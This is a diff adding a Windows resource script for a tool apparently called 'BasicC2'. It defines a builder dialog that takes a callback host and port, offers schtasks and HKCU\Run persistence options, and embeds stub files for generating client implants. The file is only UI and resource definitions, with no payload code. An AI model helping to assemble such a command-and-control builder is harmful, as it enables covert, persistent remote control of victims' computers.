@@ -1,0 +1,51 @@
+#include "resource.h"
+
+#define IDI_MAINICON        100
+#define IDD_BUILDER         3000
+#define IDC_EDIT_HOST       3001
+#define IDC_EDIT_PORT       3002
+#define IDC_CHK_STARTUP     3003
+#define IDC_CHK_SHELLDIR    3004
+#define IDC_BTN_BUILD       3006
+#define IDC_STATIC_HOST     3007
+#define IDC_STATIC_PORT     3008
+#define IDC_GROUP_PERSIST   3009
+#define IDD_PORT            3100
+#define IDC_PORT_EDIT       3101
+#define IDC_PORT_OK         3102
+#define IDC_STATIC_PORTLBL  3103
+
+IDI_MAINICON ICON "MasonIcon.ico"
+
+#define IDR_STUB_ASM    200
+#define IDR_STUB_RC     201
+#define IDR_STUB_MAN    202
+
+IDR_STUB_ASM    RCDATA  "Stub.asm"
+IDR_STUB_RC     RCDATA  "Stub.rc"
+IDR_STUB_MAN    RCDATA  "Stub.manifest"
+
+IDD_PORT DIALOGEX 0, 0, 190, 90
+STYLE 0x0080 | 0x0800 | 0x80000000 | 0x00C00000 | 0x00080000
+CAPTION "BasicC2 - Listen Port"
+FONT 8, "Tahoma"
+BEGIN
+    LTEXT           "Enter listening port:", IDC_STATIC_PORTLBL, 20, 15, 150, 12
+    EDITTEXT        IDC_PORT_EDIT, 55, 35, 80, 14, 0x0080 | 0x2000 | 0x00010000
+    DEFPUSHBUTTON   "Start", IDC_PORT_OK, 60, 62, 70, 18
+END
+
+IDD_BUILDER DIALOGEX 0, 0, 230, 175
+STYLE 0x0080 | 0x0800 | 0x80000000 | 0x00C00000 | 0x00080000
+CAPTION "BasicC2 - Builder"
+FONT 8, "Tahoma"
+BEGIN
+    LTEXT           "Host / DNS:", IDC_STATIC_HOST, 12, 16, 50, 10
+    EDITTEXT        IDC_EDIT_HOST, 65, 13, 150, 14, 0x0080 | 0x00010000
+    LTEXT           "Port:", IDC_STATIC_PORT, 12, 38, 50, 10
+    EDITTEXT        IDC_EDIT_PORT, 65, 35, 80, 14, 0x0080 | 0x00010000
+    GROUPBOX        "Persistence", IDC_GROUP_PERSIST, 8, 58, 214, 55
+    AUTOCHECKBOX    "Startup Scheduler (schtasks)", IDC_CHK_STARTUP, 18, 74, 195, 12
+    AUTOCHECKBOX    "Registry Startup (HKCU\Run)", IDC_CHK_SHELLDIR, 18, 92, 195, 12
+    DEFPUSHBUTTON   "Build Client", IDC_BTN_BUILD, 65, 128, 100, 22
+END
